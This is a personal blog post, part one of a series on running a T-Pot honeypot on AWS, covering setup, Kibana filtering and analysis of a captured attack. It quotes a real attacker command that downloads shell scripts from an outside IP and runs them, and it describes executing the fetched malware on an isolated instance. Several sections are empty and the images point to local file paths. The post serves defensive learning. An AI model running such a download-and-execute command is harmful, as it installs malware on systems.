---
title:  "Part 1 - NAHB-A : Not Another Honeypot Blog Posts"
excerpt: "Part 1 of running a T-Pot Honeypot<br>
1. What is a honeypot?<br>

2. What did I use my honeypot for?<br>

3. What honeypot setup did I use?<br>
- Connected honeypots<br>
- Technologies & Services<br>
4. What limitations did my honeypot have?
"
mathjax: true
layout: post
categories:
    -- github
    -- website

---

# Part 1

![Honey](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/honey.jpg)

## Hello and welcome to the NAHB blog post Part 1.

#### This blog is designed to give some background information on honeypots, how to setup the T-Pot, and the results of running T-Pot for 48 hours.

#### This series will be broken into 4 parts.

### [Part 1:](https://matthewomccorkle.github.io/honeypot-1/)<<You are here!

1. What is a honeypot?

2. What did I use my honeypot for?

3. What honeypot setup did I use?
- Connected honeypots

- Technologies & Services
4. What limitations did my honeypot have?

### [Part 2:](https://matthewomccorkle.github.io/honeypot-2/)

5. How to setup a honeypot

### [Part 3:](https://matthewomccorkle.github.io/honeypot-3/)

6. Expected outcomes

7. Actual outcomes

8. Analysis of logs
- Top 3 IP Addresses
- Top 5 Countries of Origin
- Top 10 Passwords
- Top 3 Commands

Most interesting findings

- Commands
- Attack Type
- Unexpected
- Something I learned and was not aware of prior to setting up the Honeypot

Mitigating vulnerabilities

### [Part 4:](https://matthewomccorkle.github.io/honeypot-4/)

What would I do differently next time?

Summary

What did I learn?

# 1. What is a honeypot?

According to Merriam-Webster a honeypot is *"one that is attractive or desirable"*<sub>[1](https://www.merriam-webster.com/dictionary/honeypot)</sub>

In the information security realm, a honeypot is defined by the function it is used for. 

Wikipedia describes a Honeypot as *"a computer security mechanism set to detect, deflect, or, in some manner, counteract attempts at unauthorized use of information systems."*<sub>[2](https://en.wikipedia.org/wiki/Honeypot_(computing)#:~:text=a%20computer%20security%20mechanism%20set%20to%20detect%2C%20deflect%2C%20or%2C%20in%20some%20manner%2C%20counteract%20attempts%20at%20unauthorized%20use%20of%20information%20systems.)</sub>

**tldr:** Generally a honeypot is a vulnerable system with a wide attack surface that attracts attackers, logs their activities and displays the informaation in a log format. 

# 2. What did I use my honeypot for?

My honeypot ran for 48 hours with a public facing IP address, with ports 1-64000 open. **Note**: Not all ports had services running. 

My intention was to gather as much intel as possible on attackers techniques and then analyze that data to determine the following:

- Common ports tested for vulnerabilities.

- Commands used by attackers.

- Passwords used by attackers.

- Countries of origin.

- Detect CVE's in a real environment.

# 3. What honeypot setup did I use?

I built my honeypot on an Amazon Web Services EC2 Debian 11 server using a t3.xlarge instance. 

Using AWS was the quick and convenient method for running the honeypot because of:

- Ease spinning up services in AWS.

- Ease of networking in AWS.
  
  - Obtaining an elastic IP address and having it connected to your instance is quick and effortless.

- Ease of security groups in AWS.

- No hardware requirements.

Reasons AWS might not be right for you:

1. ~$10/day this can get costly.

2. Provisioning of resources manually.

#### Minimum Requirements for T-Pot

Minimum suggested requirements for running T-Pot can be found [here]([GitHub - telekom-security/tpotce: 🍯 T-Pot - The All In One Honeypot Platform 🐝](https://github.com/telekom-security/tpotce#system-requirements).

#### Honeypots included in T-Pot:

All information for ports and honeypots can be found [here](https://github.com/telekom-security/tpotce#technical-concept).

# Services & Technologies used

- Amazon Web Services (EC2)

- SSH

- Elastic Stack - For searching through logs of attacks and displaying the data nicely.

- ElasticVue - For browsing and interacting with an Elastic Search cluster.

- Honeypots - 22 various Honeypots.

# How to setup T-Pot

# Expected outcomes before running honeypot

I expect a lot of the attacks and probes of ports will be automated from bots. 

I expect to see CVE's of all types. 

# How to analyze logs using Kibana > Discover

Analyzing logs in Kibana may remind you of using Splunk as they both function very similarly.  However, there are some noticeable differences in using Kibana, to understand these differences further I suggest you read Asaf Yigal's article over at [DevOps.com](https://devops.com/splunk-elk-stack-side-side-comparison/#:~:text=Kibana%20is%20the%20visualization%20tool,of%20them%20in%20a%20dashboard.). 

Every honeypot varies on what data it collects, how it collects and how it logs. Here I will show you how to filter all logs to display some of the honeypots data that I found interesting. 

**Caution:** You should filter out your own IP address from Kibana using a `is not` operator in a filter. See below an example on a `dest_ip` filter. You will want to do this for `src_ip` as well. 

![dest_IP](C:\Users\matth\AppData\Roaming\marktext\images\2022-05-18-11-41-26-image.png)

### Adbhoney Filtering & Analysis

To filter only Adbhoney Command Inputs I used the following filter in Kabana:

`eventid: adbhoney.command.input`

You can input this in the +Add Filter window the same way you entered your `dest_ip` & `src_ip` filters. 

Below you see that with the eventid filter of adbhoney.command.input I had received 99 command input events in the past 72 hours.

![adbhoney1.PNG](C:\Users\matth\Desktop\CyberSecurity%20Course\HoneyPot\adbhoney1.PNG)

In order to view details of each event you can click the drop down arrow on the left side of the event. 

![adbhoney2.PNG](C:\Users\matth\Desktop\CyberSecurity%20Course\HoneyPot\adbhoney2.PNG)

Finally, you can see the commands used by attackers on the Adbhoney Pot in the `input` field of the event viewer.

**Below** you will see that the attacker was using the command:

`cd /data/local/tmp/; busybox wget http://45.61.184.4/w.sh; sh w.sh; curl http://45.61.184.4/c.sh; sh c.sh`

![adbhoney3.PNG](C:\Users\matth\Desktop\CyberSecurity%20Course\HoneyPot\adbhoney3.PNG)

### Lets analyze the command from the example above:

**Don't know what linux commands you are seeing? Use [explainshell](https://explainshell.com/).**

*This looks like the attacker is trying to change directories.*

`cd /data/local/tmp/;`

*Here the attacker is trying to tell busybox to download `w.sh` file.*

`busybox wget http://45.61.184.4/w.sh;` 

*Now the attacker attempts to invoke the default shell for the system and run `w.sh`.*

`sh w.sh;` 

*Finally the attacker trys to download another file named `c.sh`.*

`curl http://45.61.184.4/c.sh;`

*Now the attacker attempts to invoke the default shell for the system and run `c.sh`.*

`sh c.sh`

**Remember** this is just one log event. Likely this means that this attacker will enter the honeypot again later to run the `c.sh` script. 

#### What is the `c.sh` malicious file that was curl'ed into the honeypot?

I used a [Linode](https://www.linode.com/) instance to mimic the commands my attackers used. 

**Why a seperate instance?**

I wanted to run the commands on a physically removed virtualized environment from my honeypot, personal VM's and personal network at home. 

I downloaded the c.sh contents into a c.sh file and then ran the cat command to print the file contents to the screen. So we can see that the c.sh downloads each of these 

![](C:\Users\matth\AppData\Roaming\marktext\images\2022-05-18-12-29-06-image.png)

Next I downloaded the arc file from the IP address above and determined it's file type. ![](C:\Users\matth\AppData\Roaming\marktext\images\2022-05-18-12-32-42-image.png)

Unfortunately  since this was a 32-bit file I could not run the binary. So I tried my luck downloading the x86_64 file. **Bingo**

**Disclaimer / Warning: DO NOT DOWNLOAD MALWARE ON YOUR OWN SYSTEMS**

Next I gave the x86_64 elf file **777** permissions. **AGAIN NEVER DO THIS**.

Then I executed the malicious file. 

It is a listener! But that does not tell us much. So I input the file URL into VirusTotal. Here are the results:

![](C:\Users\matth\AppData\Roaming\marktext\images\2022-05-18-12-46-56-image.png)

# Analysis of logs

- Top 10 ports used by attackers.

- Top 10 commands used by attackers.

- Top 10 passwords used by attackers.

- Top 10 countries of origin.

# Unexpected outcomes

I was browsing through hex that was passed as payload data and decoding via [Cyberchef](https://gchq.github.io/CyberChef/). At this point in my analysis of the logs I had processed about 60+ different hex payloads. 

This one stood out to me in Cyberchef as it had something that I had not seen yet in previous hex decodes I performed: `fox a 1 -1 fox hello`. 

A quick google of `fox a 1 -1 fox hello` and I find it is a NMAP script which is also on Github [here](https://github.com/nmap/nmap/blob/master/scripts/fox-info.nse). Awesome! I love using NMAP and have tried remembering all of the different scripts and their uses, but alas this one I had not used. 

**HOWEVER**, what was most unexpected of this find was that this script was designed by the author "*based off Billy Rios and Terry **McCorkle's** work.*" Yes you read that correctly. 

Honestly, this gave me a chill down my spine. If you have ever seen "[The Truman Show (1998) - IMDb](https://www.imdb.com/title/tt0120382/))" then you know I felt immediately like I was living inside of an alternate reality. 

What are the odds of finding my last name in a random honeypot hex attack payload? I am sure one of you data scientists or math experts could tell me the odds, but I believe the odds must be extremely low, nearly unlikely. 

# Mitigating the vulnerabilities through system hardening

# What would I do differently next time?

# Summary

# What did I learn?

1. I learned how to setup a blog site using Github. 
   
   a. This led to learning basic Jekyll language.

    2. I learned how the Elastic and Kibana system work. 

# Sources:

1. [Honeypot Definition & Meaning - Merriam-Webster](https://www.merriam-webster.com/dictionary/honeypot).

2. [Honeypot (computing) - Wikipedia](https://en.wikipedia.org/wiki/Honeypot_(computing)#:~:text=a%20computer%20security%20mechanism%20set%20to%20detect%2C%20deflect%2C%20or%2C%20in%20some%20manner%2C%20counteract%20attempts%20at%20unauthorized%20use%20of%20information%20systems).

3. 
